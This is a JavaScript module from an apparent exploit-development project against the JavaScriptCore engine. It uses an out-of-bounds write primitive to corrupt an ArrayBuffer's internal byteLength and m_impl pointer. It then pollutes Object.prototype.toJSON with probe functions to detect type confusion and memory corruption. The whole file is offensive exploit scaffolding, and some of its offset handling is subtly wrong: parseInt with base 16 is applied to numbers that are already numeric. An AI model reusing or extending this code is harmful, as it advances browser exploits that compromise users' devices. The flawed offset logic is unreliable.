// js/script3/testVictimABInstability.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real, // Este será o nosso alvo principal de sondagem agora
    oob_dataview_real,     // A view sobre o oob_array_buffer_real
    oob_write_absolute,
    clearOOBEnvironment,
    getBaseOffsetInDV,      // Para saber onde a view começa
    getOOBAllocationSize  // Para saber o tamanho da view
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// --- Variantes da toJSON para sondar 'this' (que esperamos ser um ArrayBuffer) ---

export function toJSON_AB_Probe_V1() {
    const FNAME_toJSON = "toJSON_AB_Probe_V1";
    let result = {
        toJSON_variant: FNAME_toJSON,
        this_type_entry: Object.prototype.toString.call(this),
        is_identified_as_array_buffer: false,
        byteLength_prop: "N/A",
        is_dataview_created: false,
        dv_write_val: 0xBADDBADD,
        dv_read_val: "N/A",
        dv_rw_match: false,
        error: null
    };

    if (result.this_type_entry !== "[object ArrayBuffer]") {
        result.error = `this is not an ArrayBuffer (type: ${result.this_type_entry})`;
        return result;
    }
    result.is_identified_as_array_buffer = true;

    try {
        result.byteLength_prop = this.byteLength;

        // Ajuste: Se o byteLength for muito grande (potencialmente corrompido),
        // o DataView pode falhar ou ser muito lento. Limitar o teste de R/W.
        const testableLength = typeof result.byteLength_prop === 'number' ? Math.min(result.byteLength_prop, 1024) : 0;

        if (testableLength >= 4) {
            const dv = new DataView(this, 0, testableLength); // Usar o 'this' diretamente
            result.is_dataview_created = true;
            dv.setUint32(0, result.dv_write_val, true);
            result.dv_read_val = dv.getUint32(0, true);
            if (result.dv_read_val === result.dv_write_val) {
                result.dv_rw_match = true;
            }
        } else {
            result.error = `byteLength (${result.byteLength_prop}) too small or invalid for DataView ops.`;
        }
    } catch (e) {
        result.error = `${e.name}: ${e.message}`;
    }
    return result;
}

export function toJSON_AB_Probe_V2_Detailed() {
    const FNAME_toJSON = "toJSON_AB_Probe_V2_Detailed";
    let result = {
        toJSON_variant: FNAME_toJSON,
        this_type_entry: Object.prototype.toString.call(this),
        is_identified_as_array_buffer: false,
        byteLength_prop: "N/A",
        is_dataview_created: false,
        dv_rw_match: false,
        error: null,
        this_type_in_loop: "N/A",
        this_type_after_loop: "N/A",
        for_in_iterations: 0,
        loop_error: null,
    };

    if (result.this_type_entry !== "[object ArrayBuffer]") {
        result.error = `this is not an ArrayBuffer (type: ${result.this_type_entry})`;
        return result;
    }
    result.is_identified_as_array_buffer = true;

    try {
        result.byteLength_prop = this.byteLength;
        const testableLength = typeof result.byteLength_prop === 'number' ? Math.min(result.byteLength_prop, 1024) : 0;

        if (testableLength >= 4) {
            const dv = new DataView(this, 0, testableLength);
            result.is_dataview_created = true;
            dv.setUint32(0, 0xFEEDFACE, true);
            if (dv.getUint32(0, true) === 0xFEEDFACE) result.dv_rw_match = true;
        } else {
             result.error = `byteLength (${result.byteLength_prop}) too small or invalid for DataView ops.`;
        }

        try {
            for (const prop in this) {
                if (result.for_in_iterations === 0) {
                    result.this_type_in_loop = Object.prototype.toString.call(this);
                }
                result.for_in_iterations++;
                if (result.for_in_iterations > 100) {
                     break;
                }
            }
        } catch (loop_e) {
            result.loop_error = `${loop_e.name}: ${loop_e.message}`;
        }
        result.this_type_after_loop = Object.prototype.toString.call(this);

    } catch (e) {
        result.error = `${e.name}: ${e.message}`;
    }
    return result;
}

// objectToProbe: O objeto que será passado para JSON.stringify (agora o oob_array_buffer_real)
// expectedObjectSize: O tamanho esperado do objectToProbe ANTES da corrupção
export async function executeVictimABInstabilityTest(objectToProbe, expectedObjectSize, corruption_offset_in_oob_ab, value_to_write, toJSONFunctionName, toJSONFunctionToUse) {
    const FNAME_TEST = "executeVictimABInstabilityTest";
    logS3(`--- Sub-Teste de Instabilidade em ArrayBuffer ---`, "subtest", FNAME_TEST);
    logS3(`  Alvo da Sondagem: ${objectToProbe === oob_array_buffer_real ? "oob_array_buffer_real" : "outro objeto"} (tamanho original esperado: ${expectedObjectSize})`, "info", FNAME_TEST);
    logS3(`  Corrupção: Escrever ${toHex(value_to_write)} em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}]`, "info", FNAME_TEST);
    logS3(`  Sonda JSON: ${toJSONFunctionName}`, "info", FNAME_TEST);

    let result = {
        stringifyError: null,
        parsedToJSONReturn: null,
        corruption_offset: corruption_offset_in_oob_ab,
        value_written: value_to_write,
        probe_function: toJSONFunctionName,
        final_verdict_is_problem: false
    };

    let originalToJSONDescriptor = null;
    let pollutionApplied = false;
    const ppKey_val = "toJSON";

    try {
        // A triggerOOB_primitive() é chamada antes pelo runAllInstabilityTestsOnVictimAB para garantir que oob_array_buffer_real exista.
        // A escrita de corrupção é feita no oob_array_buffer_real
        if (!oob_write_absolute(corruption_offset_in_oob_ab, value_to_write, 4)) { // Assumindo escrita de 32-bit
            logS3("Falha ao escrever valor de corrupção. Abortando sub-teste.", "error", FNAME_TEST);
            result.stringifyError = { name: "OOBWriteError", message: "oob_write_absolute failed" };
            return result;
        }
        logS3("   Valor de corrupção escrito com sucesso.", "good", FNAME_TEST);
        await PAUSE_S3(SHORT_PAUSE_S3); // Pequena pausa após corrupção

        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSONFunctionToUse,
            writable: true,
            enumerable: false,
            configurable: true
        });
        pollutionApplied = true;
        logS3(`   Object.prototype.toJSON poluído com ${toJSONFunctionName}.`, "info", FNAME_TEST);

        logS3(`   Chamando JSON.stringify no objeto alvo...`, "info", FNAME_TEST);
        let rawStringifyOutput = null;
        try {
            // O objectToProbe é agora o oob_array_buffer_real (ou deveria ser para Estratégia 1)
            rawStringifyOutput = JSON.stringify(objectToProbe);

            // O retorno de JSON.stringify, quando toJSON retorna um objeto, É ESSE OBJETO.
            // No entanto, o log indicou "tipo: string", então vamos tentar o parse.
            if (typeof rawStringifyOutput === 'string') {
                try {
                    result.parsedToJSONReturn = JSON.parse(rawStringifyOutput);
                } catch (parseError) {
                    logS3(`      Falha ao fazer JSON.parse do retorno de stringify (que era uma string): ${parseError}. Usando a string bruta.`, "warn", FNAME_TEST);
                    result.parsedToJSONReturn = { error: `Parse error on toJSON return: ${rawStringifyOutput}` }; // Tratar como erro
                }
            } else {
                result.parsedToJSONReturn = rawStringifyOutput; // Já é um objeto
            }

            logS3(`   JSON.stringify invocou toJSON. Objeto retornado pela sonda (após parse, se necessário): ${JSON.stringify(result.parsedToJSONReturn)}`, "info", FNAME_TEST);

        } catch (e_str) {
            result.stringifyError = { name: e_str.name, message: e_str.message, stack: e_str.stack };
            logS3(`   !!!! ERRO AO STRINGIFY objeto alvo !!!!: ${e_str.name} - ${e_str.message}`, "error", FNAME_TEST);
            if (e_str.stack) logS3(`       Stack: ${e_str.stack}`, "error");
        }

    } catch (e_main_test_logic) {
        logS3(`Erro na lógica principal do sub-teste: ${e_main_test_logic.message}`, "error", FNAME_TEST);
        if (!result.stringifyError) result.stringifyError = { name: "MainTestLogicError", message: e_main_test_logic.message };
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
            else delete Object.prototype[ppKey_val];
        }
    }
    
    const tr = result.parsedToJSONReturn;

    if (tr && typeof tr === 'object' && tr !== null) {
        if (!tr.is_identified_as_array_buffer) {
            result.final_verdict_is_problem = true;
            logS3(`      SONDA: 'this' não foi identificado como ArrayBuffer (tipo real: ${tr.this_type_entry}).`, "error", FNAME_TEST);
        } else if (tr.error) { // Erro interno na sonda APÓS ser identificado como AB
            result.final_verdict_is_problem = true;
            logS3(`      SONDA: Reportou erro interno: ${tr.error}.`, "error", FNAME_TEST);
        } else if (tr.loop_error && tr.toJSON_variant === "toJSON_AB_Probe_V2_Detailed") {
             result.final_verdict_is_problem = true;
             logS3(`      SONDA (V2): Reportou erro no loop: ${tr.loop_error}.`, "error", FNAME_TEST);
        } else { 
            let anomaly_found = false;
            // Usar expectedObjectSize para a checagem do byteLength_prop
            if (tr.byteLength_prop !== expectedObjectSize) {
                anomaly_found = true;
                logS3(`      ANOMALIA: byteLength_prop (${tr.byteLength_prop}) !== tamanho original esperado (${expectedObjectSize})`, "critical", FNAME_TEST);
            }
            if (!tr.dv_rw_match) {
                anomaly_found = true;
                logS3(`      ANOMALIA: dv_rw_match é false. Leitura/escrita no DataView falhou ou valor incorreto.`, "critical", FNAME_TEST);
            }
            if (tr.toJSON_variant === "toJSON_AB_Probe_V2_Detailed") {
                if (tr.this_type_in_loop !== "[object ArrayBuffer]" && tr.this_type_in_loop !== "N/A" && tr.for_in_iterations > 0) {
                    anomaly_found = true;
                    logS3(`      ANOMALIA (V2): this_type_in_loop é ${tr.this_type_in_loop}`, "critical", FNAME_TEST);
                }
                if (tr.this_type_after_loop !== "[object ArrayBuffer]") {
                    anomaly_found = true;
                    logS3(`      ANOMALIA (V2): this_type_after_loop é ${tr.this_type_after_loop}`, "critical", FNAME_TEST);
                }
            }
            if (anomaly_found) {
                result.final_verdict_is_problem = true;
            }
        }
    } else {
        logS3(`      Retorno da sonda (parsedToJSONReturn) não é um objeto válido ou é nulo. Valor: ${JSON.stringify(tr)}`, "warn", FNAME_TEST);
        if (!result.stringifyError) { // Se não houve erro de stringify, mas não temos um objeto da sonda, é estranho.
             result.final_verdict_is_problem = true; // Considerar isso um problema.
        }
    }

    if (result.stringifyError && result.stringifyError.name === 'RangeError') {
        logS3(`   ---> RangeError OCORREU!`, "vuln", FNAME_TEST);
        document.title = `RangeError ${toJSONFunctionName} (${toHex(value_to_write)}@${toHex(corruption_offset_in_oob_ab)})`;
        result.final_verdict_is_problem = true;
    } else if (result.stringifyError) {
        logS3(`   ---> Erro durante JSON.stringify: ${result.stringifyError.name} - ${result.stringifyError.message}`, "error", FNAME_TEST);
        result.final_verdict_is_problem = true;
    }

    if (result.final_verdict_is_problem) {
        logS3(`   PROBLEMA DETECTADO com ${toJSONFunctionName}. Corrupção: ${toHex(value_to_write)} @ offset ${toHex(corruption_offset_in_oob_ab)}`, "critical", FNAME_TEST);
        document.title = `PROBLEMA ${toJSONFunctionName} (${toHex(value_to_write)}@${toHex(corruption_offset_in_oob_ab)})`;
    } else {
        logS3(`   ${toJSONFunctionName} para objeto alvo completou sem problemas óbvios detectados.`, "good", FNAME_TEST);
    }

    logS3(`--- Sub-Teste de Instabilidade em ArrayBuffer CONCLUÍDO ---`, "subtest", FNAME_TEST);
    return result;
}

export async function runAllInstabilityTestsOnVictimAB() {
    const FNAME_RUNNER = "runAllInstabilityTestsOnVictimAB";
    logS3(`==== INICIANDO Teste Completo de Instabilidade em ArrayBuffer Vítima (Estratégia 1: Sondando oob_array_buffer_real) ====`, "test", FNAME_RUNNER);

    let overall_problem_found = false;

    // Offsets são DENTRO do oob_array_buffer_real.
    // O oob_array_buffer_real é o buffer onde as escritas OOB acontecem.
    // Ele tem um tamanho de (getBaseOffsetInDV() + getOOBAllocationSize() + 256).
    // Queremos tentar corromper os metadados do próprio oob_array_buffer_real.
    // Os metadados de um JSArrayBuffer (como seu m_byteLength) estão no início do objeto JSArrayBuffer.
    // Se o oob_array_buffer_real *é* o objeto JSArrayBuffer, então escrever em offsets pequenos como 0x18 (SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START)
    // a partir do *início do objeto JSArrayBuffer* poderia afetar seu tamanho.
    // O desafio é que oob_write_absolute usa offsets a partir do INÍCIO do ArrayBuffer bruto, não do objeto JSArrayBuffer.
    // Vamos assumir, para este teste, que o objeto JSArrayBuffer para oob_array_buffer_real começa em 0 DENTRO do buffer alocado por new ArrayBuffer().
    // Esta é uma simplificação e pode não ser verdade em implementações reais de motor JS.

    const corruption_params_to_try = [
        // Tentar corromper o byteLength (offset 0x18 a partir do início do objeto JSArrayBuffer)
        // do próprio oob_array_buffer_real.
        { name: "Corromper byteLength do oob_ab para 0xFFFFFFFF",
          offset_in_JSObject: JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START || 0x18, // Offset DENTRO do objeto JSArrayBuffer
          value: 0xFFFFFFFF },
        { name: "Corromper byteLength do oob_ab para 0 (zero)",
          offset_in_JSObject: JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START || 0x18,
          value: 0x00000000 },
        { name: "Corromper byteLength do oob_ab para 1024",
          offset_in_JSObject: JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START || 0x18,
          value: 1024 },
        { name: "Corromper byteLength do oob_ab para um valor ENORME (requer escrita 64bit)", // Exige que oob_write_absolute suporte 64bit
          offset_in_JSObject: JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START || 0x18,
          value: new AdvancedInt64(0xFFFFFFFF, 0x000000FF), size: 8 }, // Escreve 8 bytes
        // Tentar corromper o ponteiro m_impl (offset 0x10)
        { name: "Corromper m_impl do oob_ab para NULL",
          offset_in_JSObject: JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET || 0x10,
          value: new AdvancedInt64(0,0), size: 8}, // m_impl é um ponteiro (64-bit)
        { name: "Corromper m_impl do oob_ab para um valor inválido",
          offset_in_JSObject: JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET || 0x10,
          value: new AdvancedInt64(0xBADBAD00, 0xBADBAD00), size: 8},
    ];

    const toJSON_Probes = [
        { name: "toJSON_AB_Probe_V1", func: toJSON_AB_Probe_V1 },
        { name: "toJSON_AB_Probe_V2_Detailed", func: toJSON_AB_Probe_V2_Detailed },
    ];

    for (const params of corruption_params_to_try) {
        logS3(`\n[${FNAME_RUNNER}] Testando Parâmetros de Corrupção: ${params.name}`, "test", FNAME_RUNNER);

        // 1. Garantir que o oob_array_buffer_real (nosso alvo de corrupção e sondagem) exista.
        //    Cada iteração de corrupção operará sobre um oob_array_buffer_real "fresco".
        clearOOBEnvironment();
        if (!triggerOOB_primitive()) {
            logS3("Falha crítica ao criar oob_array_buffer_real. Abortando teste.", "critical", FNAME_RUNNER);
            break;
        }
        // O oob_array_buffer_real agora existe e é o nosso alvo.
        const current_oob_ab_size = oob_array_buffer_real.byteLength; // Tamanho ANTES da corrupção
        logS3(`   Alvo da sondagem e corrupção: oob_array_buffer_real (tamanho inicial: ${current_oob_ab_size})`, "info", FNAME_RUNNER);


        // O params.offset_in_JSObject é o offset DENTRO da estrutura JSArrayBuffer.
        // oob_write_absolute espera um offset a partir do INÍCIO do buffer de dados brutos.
        // Assumindo que o objeto JSArrayBuffer para oob_array_buffer_real começa no offset 0 do buffer bruto.
        const actual_write_offset = parseInt(params.offset_in_JSObject, 16); // Converter de string hex para número

        for (const probe of toJSON_Probes) {
            // É importante recriar o oob_array_buffer_real ANTES de cada escrita + sonda
            // para garantir que estamos testando o efeito da escrita atual.
            // No entanto, se queremos que a escrita persista para a sonda, não devemos limpar/recriar aqui.
            // A limpeza agora é feita no final do loop de `params`.
            // A escrita de corrupção é feita dentro de executeVictimABInstabilityTest.

            const test_result = await executeVictimABInstabilityTest(
                oob_array_buffer_real,    // Sondar o próprio buffer que tentamos corromper
                current_oob_ab_size,      // Passar o tamanho original para comparação
                actual_write_offset,      // Offset de escrita DENTRO do oob_array_buffer_real
                params.value,             // Valor a ser escrito
                probe.name,
                probe.func
            );
            if (test_result.final_verdict_is_problem) {
                overall_problem_found = true;
            }
            await PAUSE_S3(MEDIUM_PAUSE_S3); // Pausa entre sondas

            // Se o oob_array_buffer_real foi severamente corrompido (ex: ponteiro m_impl nulo),
            // pode ser instável para a próxima sonda. Considerar recriar se necessário,
            // ou aceitar que a segunda sonda pode falhar de forma diferente.
            // Por ora, a próxima sonda usará o buffer no estado em que a escrita o deixou.
        }
        // clearOOBEnvironment() foi movido para o início do loop de params.
    }

    if (overall_problem_found) {
         logS3(`==== Teste Completo de Instabilidade CONCLUÍDO: UM OU MAIS PROBLEMAS FORAM DETECTADOS. Verifique logs. ====`, "vuln", FNAME_RUNNER);
         document.title = "PROBLEMA(S) DETECTADO(S) - Teste AB Instability";
    } else {
        logS3(`==== Teste Completo de Instabilidade CONCLUÍDO: NENHUM PROBLEMA ÓBVIO DETECTADO. ====`, "good", FNAME_RUNNER);
    }
    clearOOBEnvironment(); // Limpeza final
}
